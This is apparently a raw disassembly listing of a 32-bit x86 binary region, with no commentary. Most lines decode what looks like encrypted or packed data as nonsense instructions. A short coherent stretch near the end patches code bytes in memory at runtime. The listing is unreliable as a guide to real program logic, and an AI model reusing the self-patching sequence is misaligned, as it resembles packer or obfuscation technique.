  4030d0:	jle    0x4030d4
  4030d2:	call   0x5280:0xccfe5edf
  4030d9:	mov    WORD PTR [edx],gs
  4030db:	sar    BYTE PTR [edi+ecx*1-0x2b803b44],cl
  4030e2:	xor    dh,ch
  4030e4:	es iret 
  4030e6:	mov    dl,0x44
  4030e8:	mov    ebp,0x9c4e6d7a
  4030ed:	add    BYTE PTR [ecx+ebp*8+0x1528e03e],ah
  4030f4:	lds    ebx,FWORD PTR [ecx]
  4030f6:	call   0xf0a61544
  4030fb:	stos   BYTE PTR es:[edi],al
  4030fc:	and    al,0x61
  4030fe:	push   eax
  4030ff:	xchg   edi,eax
  403100:	stos   BYTE PTR es:[edi],al
  403101:	retf   0x5c1e
  403104:	test   BYTE PTR [esi+0x4239972a],cl
  40310a:	pop    ebx
  40310b:	fwait
  40310c:	adc    eax,0x5b1892a7
  403111:	sahf   
  403112:	ficom  WORD PTR [ebx]
  403114:	mov    WORD PTR [ebx-0xa8da704],fs
  40311a:	test   eax,0x6d95090a
  40311f:	ja     0x4030ba
  403121:	and    BYTE PTR [ebx],cl
  403123:	xor    eax,DWORD PTR [eax+eiz*8+0x2ddf685]
  40312a:	aas    
  40312b:	shl    BYTE PTR [ebx+0x1ddea2be],0x7d
  403132:	push   esp
  403133:	add    cl,BYTE PTR ds:0xc11929c
  403139:	jns    0x4030fe
  40313b:	stos   DWORD PTR es:[edi],eax
  40313c:	retf   
  40313d:	arpl   WORD PTR [ebx+0x11a0bec4],sp
  403143:	leave  
  403144:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403146:	loope  0x40312d
  403148:	mov    eax,ds:0x69472ab3
  40314d:	inc    esi
  40314e:	cwde   
  40314f:	lea    esp,[ecx]
  403151:	fs sahf 
  403153:	mov    bl,0xed
  403155:	pop    esi
  403156:	loopne 0x4031a7
  403158:	call   0x77026f30
  40315d:	fwait
  40315e:	addr16 mov ebx,0xfc899bdf
  403164:	push   ebx
  403165:	loop   0x40318d
  403167:	adc    DWORD PTR [eax+0x6f6f69ad],edi
  40316d:	outs   dx,BYTE PTR ds:[esi]
  40316e:	push   0xffffffc9
  403170:	icebp  
  403171:	les    edi,FWORD PTR [edi]
  403173:	jno    0x40311d
  403175:	aaa    
  403176:	jns    0x403153
  403178:	iret   
  403179:	ss test eax,0x88f24ccb
  40317f:	mov    ds:0x369c7669,eax
  403184:	pop    edx
  403185:	(bad)  
  403186:	cwde   
  403187:	das    
  403188:	sbb    esp,esi
  40318a:	jl     0x40313b
  40318c:	jmp    0x4031ca
  40318e:	nop
  40318f:	dec    ebp
  403190:	cmp    al,dh
  403192:	mov    esp,0xd2a14900
  403197:	hlt    
  403198:	add    eax,0x427aa941
  40319d:	fidiv  WORD PTR [edi+esi*8-0x30]
  4031a1:	bound  edx,QWORD PTR [eax+0x23]
  4031a4:	cmp    eax,0xb22406a8
  4031a9:	push   ebx
  4031aa:	icebp  
  4031ab:	or     ch,dl
  4031ad:	call   0xb8e4b5e3
  4031b2:	imul   BYTE PTR [edi+ebx*2-0x38]
  4031b6:	mov    edi,0xf231c6ab
  4031bb:	call   0x556e4b93
  4031c0:	pop    edi
  4031c1:	add    esp,DWORD PTR ds:0x891246a
  4031c7:	bound  edx,QWORD PTR [esi-0x3acded44]
  4031cd:	imul   eax,edx,0x3a
  4031d0:	push   edx
  4031d1:	fdivr  QWORD PTR [ecx]
  4031d3:	dec    esi
  4031d4:	out    dx,eax
  4031d5:	cmp    DWORD PTR [edx],esi
  4031d7:	xor    al,0x9b
  4031d9:	test   BYTE PTR [edi+eax*1+0x6a9fed10],cl
  4031e0:	sahf   
  4031e1:	add    DWORD PTR [esi+ebp*1-0x2961c542],0xffffffa3
  4031e9:	popf   
  4031ea:	fst    QWORD PTR [eax+0x37bf861f]
  4031f0:	adc    eax,0x61e0d070
  4031f5:	jb     0x4031de
  4031f7:	sti    
  4031f8:	adc    DWORD PTR [ebx-0x384c464a],ebx
  4031fe:	inc    edi
  4031ff:	(bad)  
  403201:	imul   BYTE PTR [edi-0x272dd372]
  403207:	push   esp
  403208:	dec    ebp
  403209:	bound  eax,QWORD PTR [edi]
  40320b:	mov    edx,0x14ee95a7
  403210:	xor    BYTE PTR [ebx],bh
  403212:	pop    esi
  403213:	adc    DWORD PTR [eax],esp
  403215:	ds xchg edx,eax
  403217:	push   0xffffffce
  403219:	lods   eax,DWORD PTR ds:[esi]
  40321a:	loop   0x403238
  40321c:	adc    eax,esp
  40321e:	cmp    DWORD PTR [edx-0x6b41988d],edx
  403224:	or     al,0x71
  403226:	mov    BYTE PTR [ecx-0x4d],al
  403229:	pop    ebp
  40322a:	adc    edx,DWORD PTR [edx+edx*4]
  40322d:	test   BYTE PTR [edx+0x8],dl
  403230:	outs   dx,DWORD PTR ds:[esi]
  403231:	cs push ebp
  403233:	mov    ch,0xbc
  403235:	stos   DWORD PTR es:[edi],eax
  403236:	mov    bl,0x8c
  403238:	jbe    0x403229
  40323a:	push   eax
  40323b:	inc    ebp
  40323c:	bound  edi,QWORD PTR [ecx+0x1facd311]
  403242:	std    
  403243:	or     edi,DWORD PTR [eax]
  403245:	fcomp  QWORD PTR [edi+0x5291d628]
  40324b:	rcr    DWORD PTR [edx*4-0x51bf1dd],cl
  403252:	push   0x6e6f0dda
  403257:	xchg   BYTE PTR [ecx+0x67],dh
  40325a:	popf   
  40325b:	pop    ecx
  40325c:	xchg   edx,eax
  40325d:	add    al,0x44
  40325f:	inc    eax
  403260:	pop    ebp
  403261:	into   
  403262:	outs   dx,DWORD PTR ds:[esi]
  403263:	mov    bh,dl
  403265:	aas    
  403266:	test   ah,dl
  403268:	add    BYTE PTR [edi+ebp*1-0x5bb4643e],ah
  40326f:	sub    dl,BYTE PTR [edi]
  403271:	mov    ebp,0x443fd738
  403276:	jle    0x403266
  403278:	jge    0x4032b4
  40327a:	mov    ss,WORD PTR [edx+0x5d77e461]
  403280:	std    
  403281:	sbb    ecx,ebp
  403283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403284:	scas   eax,DWORD PTR es:[edi]
  403285:	std    
  403286:	and    ah,dl
  403288:	push   esp
  403289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40328a:	mov    ch,0x7a
  40328c:	jns    0x40322f
  40328e:	cmp    eax,0xff91da5
  403293:	les    ebp,FWORD PTR [edi+edi*2-0x1f56b3ec]
  40329a:	idiv   BYTE PTR [eax+ecx*4-0x3dd38000]
  4032a1:	scas   eax,DWORD PTR es:[edi]
  4032a2:	inc    ebp
  4032a3:	mov    BYTE PTR es:[ebp+0x26],dl
  4032a7:	arpl   WORD PTR [ecx],cx
  4032a9:	clc    
  4032aa:	fmul   QWORD PTR [edx]
  4032ac:	cld    
  4032ad:	mov    DWORD PTR [esi],eax
  4032af:	inc    esp
  4032b0:	pushw  ds
  4032b2:	or     ecx,eax
  4032b4:	mov    ds:0x564a31b4,eax
  4032b9:	xchg   edi,eax
  4032ba:	push   edi
  4032bb:	fwait
  4032bc:	pop    esp
  4032bd:	mov    al,0xd1
  4032bf:	jecxz  0x4032fb
  4032c1:	push   ss
  4032c2:	sbb    BYTE PTR [ebx-0x80],al
  4032c5:	or     DWORD PTR [edx+0x1a1b353b],esi
  4032cb:	inc    edi
  4032cc:	cmp    edx,esp
  4032ce:	js     0x4032d9
  4032d0:	addr16 push eax
  4032d2:	xchg   esp,eax
  4032d3:	imul   ebx,DWORD PTR [ecx-0x1e24a79a],0x3a
  4032da:	and    al,0x7
  4032dc:	(bad)  
  4032de:	mov    bh,0x48
  4032e0:	push   eax
  4032e1:	jno    0x403275
  4032e3:	push   es
  4032e4:	xchg   ebp,eax
  4032e5:	int3   
  4032e6:	js     0x4032fe
  4032e8:	or     ebp,DWORD PTR [edx]
  4032ea:	in     al,dx
  4032eb:	in     eax,0x3c
  4032ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ee:	jnp    0x4032d3
  4032f0:	hlt    
  4032f1:	cmp    BYTE PTR [esp+edi*2],bh
  4032f4:	and    eax,0x4bbfde72
  4032f9:	into   
  4032fa:	aam    0xea
  4032fc:	cmp    edi,eax
  4032fe:	jb     0x403313
  403300:	iret   
  403301:	stos   BYTE PTR es:[edi],al
  403302:	cdq    
  403303:	xor    eax,0x6beb353e
  403308:	out    dx,al
  403309:	sbb    DWORD PTR [edx+0x52],eax
  40330c:	ret    0xb2e6
  40330f:	shl    DWORD PTR [esi+eiz*8-0x46034121],0x6c
  403317:	push   0x9e582307
  40331c:	mov    al,ds:0x2e4adcfd
  403321:	mov    dl,0x5a
  403323:	cmp    edi,DWORD PTR [eax]
  403325:	push   0x1d42ac4
  40332a:	retf   
  40332b:	ret    
  40332c:	sub    dl,bl
  40332e:	push   edx
  40332f:	fwait
  403330:	mov    ebp,0xfe57431e
  403335:	push   edi
  403336:	loope  0x40332e
  403338:	mov    eax,ds:0xfabc268c
  40333d:	loop   0x4032c0
  40333f:	inc    ebx
  403340:	pusha  
  403341:	das    
  403342:	iret   
  403343:	test   edx,edi
  403345:	enter  0xb374,0xa
  403349:	xor    DWORD PTR [edx+0x3bb15597],eax
  40334f:	lea    esi,[edx]
  403351:	inc    ebp
  403352:	mov    ah,0x3d
  403354:	sti    
  403355:	push   ebp
  403356:	lods   eax,DWORD PTR ds:[esi]
  403357:	xchg   ebp,eax
  403358:	push   ebx
  403359:	push   esp
  40335a:	and    edx,DWORD PTR [ebx-0x196ec04d]
  403360:	clc    
  403361:	jno    0x40335c
  403363:	mov    edi,0xdf380def
  403368:	push   0x3d0f29fb
  40336d:	cdq    
  40336e:	mov    ds:0xd574f37c,al
  403373:	mov    bh,0x72
  403375:	clc    
  403376:	sbb    DWORD PTR [edx],ebp
  403378:	or     bl,cl
  40337a:	jge    0x4033a4
  40337c:	dec    esi
  40337d:	xor    DWORD PTR [eax-0x42325b29],edi
  403383:	cwde   
  403384:	das    
  403385:	inc    ebx
  403386:	scas   eax,DWORD PTR es:[edi]
  403387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403388:	mov    eax,ds:0x7ddd83dc
  40338d:	jl     0x403341
  40338f:	imul   edx,DWORD PTR [ecx+0x2f],0x57d21f15
  403396:	sbb    DWORD PTR [edi-0x7f8a3a86],ecx
  40339c:	enter  0x104,0x64
  4033a0:	mov    eax,0x96c5a142
  4033a5:	inc    edx
  4033a6:	inc    ebx
  4033a7:	adc    ecx,ebx
  4033a9:	inc    edx
  4033aa:	mov    ds:0xdcc3cf97,eax
  4033af:	xchg   esp,eax
  4033b0:	mov    dh,0xd7
  4033b2:	test   DWORD PTR [ebx+0x7bd6ed99],0xb7cc1596
  4033bc:	cmc    
  4033bd:	rcr    bl,cl
  4033bf:	popa   
  4033c0:	push   ds
  4033c1:	stos   BYTE PTR es:[edi],al
  4033c2:	scas   al,BYTE PTR es:[edi]
  4033c3:	loop   0x4033f0
  4033c5:	or     DWORD PTR [edx],0xffffff98
  4033c8:	ins    DWORD PTR es:[edi],dx
  4033c9:	sub    al,0xda
  4033cb:	xor    DWORD PTR [edi-0x8cf3503],esi
  4033d1:	in     al,0x3c
  4033d3:	dec    esi
  4033d4:	out    0x2e,eax
  4033d6:	cs xchg esp,eax
  4033d8:	cli    
  4033d9:	mov    ebx,DWORD PTR [eax+0x7ddb951a]
  4033df:	adc    esp,esi
  4033e1:	hlt    
  4033e2:	mov    bl,0xd8
  4033e4:	fwait
  4033e5:	lahf   
  4033e6:	inc    ebx
  4033e7:	loope  0x4033e8
  4033e9:	jle    0x4033ed
  4033eb:	xor    edi,eax
  4033ed:	nop
  4033ee:	fnstcw WORD PTR [eax+0x20b10c85]
  4033f4:	push   eax
  4033f5:	push   edx
  4033f6:	ds aad 0xcc
  4033f9:	mov    dl,0x8b
  4033fb:	mov    BYTE PTR [esi],cl
  4033fd:	sbb    DWORD PTR [ecx+0x4e2c57f4],edx
  403403:	ror    bh,1
  403405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403406:	jnp    0x403399
  403408:	jno    0x403471
  40340a:	fsub   DWORD PTR [esi+0x14]
  40340d:	mov    esp,0x84ee4d97
  403412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403413:	add    eax,0xc70ddea7
  403418:	xchg   ah,dl
  40341a:	ins    DWORD PTR es:[edi],dx
  40341b:	jmp    0xb656369a
  403420:	or     al,0xf0
  403422:	sti    
  403423:	fbstp  TBYTE PTR [eax+0x5a7cb797]
  403429:	and    BYTE PTR [eax],bh
  40342b:	push   edx
  40342c:	test   BYTE PTR [esi+0x3ac3285],ah
  403432:	push   esi
  403433:	test   BYTE PTR [ecx+0x19],bh
  403436:	jle    0x403473
  403438:	mov    BYTE PTR [edx+0x66e63eba],dl
  40343e:	cmc    
  40343f:	push   es
  403440:	or     eax,0x3578da7f
  403445:	ret    
  403446:	mov    ds:0x1ef18fc,eax
  40344b:	mov    al,ds:0x5cbf9582
  403450:	sbb    BYTE PTR [ecx],bh
  403452:	out    0x59,eax
  403454:	or     bh,BYTE PTR [edi+0x10]
  403457:	shl    BYTE PTR [esi+0x35],1
  40345a:	jg     0x40343c
  40345c:	lock dec eax
  40345e:	xchg   ecx,eax
  40345f:	sub    BYTE PTR [eax],ah
  403461:	xchg   esi,eax
  403462:	clc    
  403463:	pop    eax
  403464:	dec    eax
  403465:	lea    esi,[ebx-0x69]
  403468:	repz cmp edi,ebx
  40346b:	hlt    
  40346c:	stos   BYTE PTR es:[edi],al
  40346d:	(bad)  
  40346e:	cmp    DWORD PTR [ebp+esi*2+0x3f],eax
  403472:	dec    ecx
  403473:	dec    edx
  403474:	mov    edi,0xfa43cecf
  403479:	int3   
  40347a:	mov    esi,0xab5b020d
  40347f:	cmc    
  403480:	(bad)  [ebx]
  403482:	inc    eax
  403483:	cwde   
  403484:	xchg   ecx,eax
  403485:	leave  
  403486:	sbb    esi,esp
  403488:	cmc    
  403489:	pusha  
  40348a:	or     ch,BYTE PTR [eax+0x2c]
  40348d:	xor    bh,BYTE PTR [ecx]
  40348f:	adc    eax,0x5187739c
  403494:	push   eax
  403495:	cmp    al,0x2e
  403497:	mov    edx,0xa93b1652
  40349c:	push   ss
  40349d:	mov    al,ds:0x9c321560
  4034a2:	xor    dl,BYTE PTR [ebx+0x51]
  4034a5:	mov    al,ds:0xbbe6c804
  4034aa:	cdq    
  4034ab:	push   0x68f353
  4034b0:	sahf   
  4034b1:	push   ebx
  4034b2:	pop    esi
  4034b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b4:	cmp    esp,DWORD PTR [eax+0x5a8ee99]
  4034ba:	ins    BYTE PTR es:[edi],dx
  4034bb:	pop    edi
  4034bc:	je     0x40347f
  4034be:	ins    BYTE PTR es:[edi],dx
  4034bf:	sar    DWORD PTR [edi-0x22],cl
  4034c2:	mov    ecx,0xdecde9e5
  4034c7:	sar    DWORD PTR [edx+0x7dfba5a3],0x86
  4034ce:	or     ch,BYTE PTR [esi]
  4034d0:	pop    ebx
  4034d1:	lods   al,BYTE PTR ds:[esi]
  4034d2:	inc    ecx
  4034d3:	lods   al,BYTE PTR ds:[esi]
  4034d4:	pop    DWORD PTR [eax]
  4034d6:	lods   al,BYTE PTR ds:[esi]
  4034d7:	aas    
  4034d8:	mov    al,0xa8
  4034da:	jo     0x403522
  4034dc:	push   ss
  4034dd:	ret    
  4034de:	cmp    al,0x12
  4034e0:	repz mov ah,0x83
  4034e3:	popa   
  4034e4:	out    0x94,eax
  4034e6:	sbb    al,0x5a
  4034e8:	pushf  
  4034e9:	jp     0x403569
  4034eb:	xchg   edx,eax
  4034ec:	xchg   ecx,eax
  4034ed:	in     al,dx
  4034ee:	shl    ch,1
  4034f0:	(bad)  
  4034f2:	add    al,0x35
  4034f4:	stos   BYTE PTR es:[edi],al
  4034f5:	mov    al,ds:0x3a4d4470
  4034fa:	and    BYTE PTR [esi],cl
  4034fc:	adc    BYTE PTR ds:0x952565f2,ah
  403502:	int3   
  403503:	pop    es
  403504:	pushf  
  403505:	sbb    esi,DWORD PTR [ebp-0x63]
  403508:	mov    ebx,0x118dd883
  40350d:	aam    0xe0
  40350f:	arpl   WORD PTR [eax],sp
  403511:	mov    DWORD PTR [ebx-0x4ec322a6],eax
  403517:	mov    eax,0x3c9aede0
  40351c:	xchg   ecx,eax
  40351d:	mov    bl,0x60
  40351f:	and    edx,edi
  403521:	(bad)  
  403522:	gs ja  0x4034a7
  403525:	mov    al,0x94
  403527:	inc    esp
  403528:	xchg   ebp,eax
  403529:	in     eax,dx
  40352a:	or     BYTE PTR [edi+0x58],al
  40352d:	xchg   esi,eax
  40352e:	std    
  40352f:	cmp    BYTE PTR [ebx],ah
  403531:	ffree  st(6)
  403533:	cdq    
  403534:	jns    0x403593
  403536:	pop    es
  403537:	movups xmm6,XMMWORD PTR [esi-0x6]
  40353b:	push   ebx
  40353c:	mov    cs,WORD PTR [ecx-0x78]
  40353f:	aad    0xab
  403541:	push   ss
  403542:	xchg   edx,eax
  403543:	push   ebx
  403544:	and    BYTE PTR [esi-0x7f],cl
  403547:	push   ss
  403548:	inc    esp
  403549:	int    0xe6
  40354b:	xor    DWORD PTR [ecx-0x3],ebx
  40354e:	mov    ch,0xbd
  403550:	adc    BYTE PTR [edx+0x7ab61624],0xa7
  403557:	cmp    BYTE PTR ds:0xd869547,dh
  40355d:	sbb    dl,BYTE PTR [eax-0x4d]
  403560:	aam    0xd6
  403562:	mov    al,0xe4
  403564:	add    ah,BYTE PTR ds:0xfd6c0da
  40356a:	xchg   ebp,eax
  40356b:	mov    bl,0xb1
  40356d:	or     edi,ebp
  40356f:	es jae 0x403554
  403572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403573:	test   al,0x58
  403575:	jg     0x403550
  403577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403578:	inc    esp
  403579:	popf   
  40357a:	pop    eax
  40357b:	stc    
  40357c:	rol    BYTE PTR [ebp-0x7d7a1ce1],0xc1
  403583:	imul   esi,DWORD PTR [ebp+0xad6c395],0x1e3e905b
  40358d:	push   esp
  40358e:	pop    ebp
  40358f:	lds    edi,FWORD PTR [eax-0x7a9b27e6]
  403595:	xor    DWORD PTR [esi+0x67],esp
  403598:	ins    DWORD PTR es:[edi],dx
  403599:	ret    
  40359a:	fiadd  WORD PTR [esi+0x4c]
  40359d:	imul   edx,DWORD PTR [esi],0x62ce3443
  4035a3:	scas   eax,DWORD PTR es:[edi]
  4035a4:	sbb    ebx,ecx
  4035a6:	js     0x40352b
  4035a8:	push   ebp
  4035a9:	outs   dx,BYTE PTR ds:[esi]
  4035aa:	xchg   ebp,eax
  4035ab:	adc    BYTE PTR [ebp+0x6a],bl
  4035ae:	or     ch,BYTE PTR [edx-0x6ca390dd]
  4035b4:	xor    esp,ebp
  4035b6:	test   DWORD PTR [edi-0x5e331272],edi
  4035bc:	fadd   st,st(1)
  4035be:	push   es
  4035bf:	retf   0x87c
  4035c2:	or     al,ah
  4035c4:	pop    edx
  4035c5:	mov    ss,WORD PTR [ebx]
  4035c7:	push   eax
  4035c8:	(bad)  
  4035c9:	sti    
  4035ca:	enter  0xd592,0xe9
  4035ce:	cwde   
  4035cf:	jbe    0x4035fc
  4035d1:	repz adc BYTE PTR [ecx],0x5d
  4035d5:	cmp    BYTE PTR ds:0xad753281,bh
  4035db:	sub    DWORD PTR [esi+0x77d473dc],0x7722d641
  4035e5:	in     eax,0xb6
  4035e7:	pop    ebx
  4035e8:	mov    dh,0xa2
  4035ea:	lock mov ah,0x75
  4035ed:	add    dh,BYTE PTR [esi+0x23bc85b1]
  4035f3:	enter  0xfe97,0xec
  4035f7:	imul   edx,DWORD PTR [ebx+0x22],0x2128dbde
  4035fe:	xchg   ebp,eax
  4035ff:	stos   DWORD PTR es:[edi],eax
  403600:	in     al,dx
  403601:	xchg   esp,eax
  403602:	scas   eax,DWORD PTR es:[edi]
  403603:	cmc    
  403604:	into   
  403605:	hlt    
  403606:	inc    ecx
  403607:	mov    eax,0xa4132b8a
  40360c:	xor    esi,DWORD PTR [ecx+0x58]
  40360f:	sub    eax,0x3b6da64a
  403614:	adc    bh,BYTE PTR [esp+edx*1-0x1e]
  403618:	iret   
  403619:	push   0x75a87b46
  40361e:	mov    ebp,0x2ae00640
  403623:	mov    ebx,0xd2a37e16
  403628:	mov    eax,0x40c93af5
  40362d:	nop
  40362e:	add    BYTE PTR [esi],dh
  403630:	or     edi,edx
  403632:	sub    BYTE PTR [eax+0x67],0x8a
  403636:	mov    edi,0x7f1d3c35
  40363b:	hlt    
  40363c:	cmc    
  40363d:	jmp    0xded082b7
  403642:	and    DWORD PTR [ebp+0x18],ebx
  403645:	xchg   ebp,eax
  403646:	sub    al,0x18
  403648:	cli    
  403649:	lds    ebx,FWORD PTR [ecx-0x29]
  40364c:	pop    eax
  40364d:	xor    edx,DWORD PTR [edi]
  40364f:	pop    esi
  403650:	sub    al,0xaa
  403652:	shl    BYTE PTR [esi+0x22],0x59
  403656:	mov    al,ds:0x8c03c891
  40365b:	mov    ds:0xf1d2ec46,al
  403660:	loop   0x403677
  403662:	retf   
  403663:	jno    0x403652
  403665:	out    0xaa,eax
  403667:	imul   eax,DWORD PTR [ebx+0x1f0ab4c9],0x54
  40366e:	adc    bl,BYTE PTR [esi]
  403670:	in     eax,0x37
  403672:	sar    BYTE PTR [ecx-0x29ce1102],cl
  403678:	push   ebp
  403679:	inc    ecx
  40367a:	sbb    eax,ecx
  40367c:	aas    
  40367d:	inc    ebp
  40367e:	pop    es
  40367f:	call   0xf8bf2a32
  403684:	sub    DWORD PTR [ebx+esi*8-0x172614a4],edx
  40368b:	push   ds
  40368c:	iret   
  40368d:	lss    ecx,FWORD PTR [ebp-0x29997945]
  403694:	enter  0xe0ac,0xdc
  403698:	sub    eax,0x6a048b15
  40369d:	fs loop 0x4036e8
  4036a0:	mov    WORD PTR [esi],gs
  4036a2:	fstp   st(5)
  4036a4:	fdivr  QWORD PTR [ecx]
  4036a6:	add    eax,0xa38024b4
  4036ab:	in     al,dx
  4036ac:	out    0x34,eax
  4036ae:	dec    esp
  4036af:	stos   DWORD PTR es:[edi],eax
  4036b0:	mov    esi,0xacdcc4ff
  4036b5:	xchg   DWORD PTR [edx+0x7c8c4de9],eax
  4036bb:	ror    BYTE PTR [edx-0x14],1
  4036be:	bound  esp,QWORD PTR [ecx-0x6f510aa3]
  4036c4:	jno    0x403685
  4036c6:	dec    BYTE PTR ds:0x6e6fbbd0
  4036cc:	test   al,0x9e
  4036ce:	arpl   di,bp
  4036d0:	test   BYTE PTR [ebp-0x22],bh
  4036d3:	xchg   edi,eax
  4036d4:	cmp    ebx,DWORD PTR [eax-0x60]
  4036d7:	cwde   
  4036d8:	add    BYTE PTR [ebx],bl
  4036da:	fsubr  QWORD PTR [edx+0x2a]
  4036dd:	(bad)  
  4036de:	in     al,0x7b
  4036e0:	or     al,BYTE PTR [ebp+0x4bd19679]
  4036e6:	adc    al,0x90
  4036e8:	and    eax,0xf603dec5
  4036ed:	scas   eax,DWORD PTR es:[edi]
  4036ee:	add    al,0x1c
  4036f0:	cwde   
  4036f1:	pop    ecx
  4036f2:	inc    eax
  4036f3:	xor    eax,0x15b1d90a
  4036f8:	xor    DWORD PTR [esi+0x33],esi
  4036fb:	test   BYTE PTR [eax+0x70],bl
  4036fe:	or     al,0xe2
  403700:	retf   0x6357
  403703:	ret    
  403704:	aam    0x42
  403706:	dec    esi
  403707:	mov    DWORD PTR [ebp-0x4c4d1d5],esi
  40370d:	inc    edx
  40370e:	outs   dx,BYTE PTR ds:[esi]
  40370f:	popa   
  403710:	xchg   ebx,eax
  403711:	rol    BYTE PTR [ebx-0x28],0x3
  403715:	xchg   esi,eax
  403716:	cld    
  403717:	les    ebp,FWORD PTR [esi+0x39]
  40371a:	dec    ebp
  40371b:	scas   al,BYTE PTR es:[edi]
  40371c:	and    al,0xa
  40371e:	add    BYTE PTR [edi+0x2e],bl
  403721:	daa    
  403722:	jbe    0x403746
  403724:	gs cmp al,ch
  403727:	xor    al,0x1b
  403729:	mov    eax,0xfb45ffd5
  40372e:	lea    eax,[ebp-0x2e]
  403731:	adc    DWORD PTR [eax+0x2a],edx
  403734:	lods   al,BYTE PTR ds:[esi]
  403735:	mov    eax,ds:0x54047005
  40373a:	push   ss
  40373b:	cwde   
  40373c:	and    eax,0x7a803f89
  403741:	ror    BYTE PTR [edi],cl
  403743:	shl    BYTE PTR [ebx-0x6737522b],1
  403749:	ja     0x403743
  40374b:	mov    ebx,0x739d73d
  403750:	ret    
  403751:	cli    
  403752:	mov    ebp,0xbae45369
  403757:	push   edi
  403758:	inc    eax
  403759:	iret   
  40375a:	adc    DWORD PTR [eax+0x5cebb241],edi
  403760:	push   ecx
  403761:	dec    esi
  403762:	(bad)
  403766:	adc    eax,0xffffffae
  403769:	mov    eax,ds:0x53399120
  40376e:	pop    ebp
  40376f:	mov    ch,0x16
  403771:	or     eax,0x49c4f3fe
  403776:	shl    DWORD PTR [edi+edx*4-0x523bbc1d],cl
  40377d:	test   eax,0x2be8ef14
  403782:	mov    ecx,0xfa4e7602
  403787:	push   0xe2f39670
  40378c:	add    al,0x72
  40378e:	in     al,dx
  40378f:	jl     0x4037ca
  403791:	into   
  403792:	mov    ebx,0x4e9074f6
  403797:	(bad)
  40379c:	jl     0x40375f
  40379e:	push   es
  40379f:	mov    WORD PTR [edx],fs
  4037a1:	(bad)  
  4037a2:	fmul   DWORD PTR [esi+0x19]
  4037a5:	aad    0x2
  4037a7:	jnp    0x403799
  4037a9:	mov    bl,0x54
  4037ab:	inc    ebp
  4037ac:	mov    dl,0xb2
  4037ae:	jle    0x403762
  4037b0:	loopne 0x403822
  4037b2:	ficom  WORD PTR [esi+0x4a]
  4037b5:	adc    BYTE PTR ds:0x308027d6,cl
  4037bb:	push   edi
  4037bc:	inc    eax
  4037bd:	fcmovnbe st,st(0)
  4037bf:	jns    0x4037e1
  4037c1:	ja     0x403782
  4037c3:	fidiv  WORD PTR [edx+0x5c]
  4037c6:	mov    eax,ds:0x9912341f
  4037cb:	add    DWORD PTR [eax],ebp
  4037cd:	add    ecx,ecx
  4037cf:	fadd   DWORD PTR [ecx+0x7b19355]
  4037d5:	ret    0x9d60
  4037d8:	es jmp 0xfc224a2b
  4037de:	lods   al,BYTE PTR ds:[esi]
  4037df:	jmp    0x403785
  4037e1:	xchg   esp,eax
  4037e2:	or     bl,BYTE PTR [edx+0x6a]
  4037e5:	push   ds
  4037e6:	test   eax,0xfa49c904
  4037eb:	fcomp  DWORD PTR [edx]
  4037ed:	dec    ecx
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fs fmul st(0),st
  40389a:	cmp    ebx,edx
  40389c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40389d:	fstp   QWORD PTR [edi+0x62]
  4038a0:	(bad)  
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	bound  ebp,QWORD PTR [ebp+0x75a06680]
  4038aa:	imul   ebx,edi,0x7be83fe4
  4038b0:	fwait
  4038b1:	dec    ebp
  4038b2:	jmp    0xb933:0x4bb43a00
  4038b9:	xor    edi,ebx
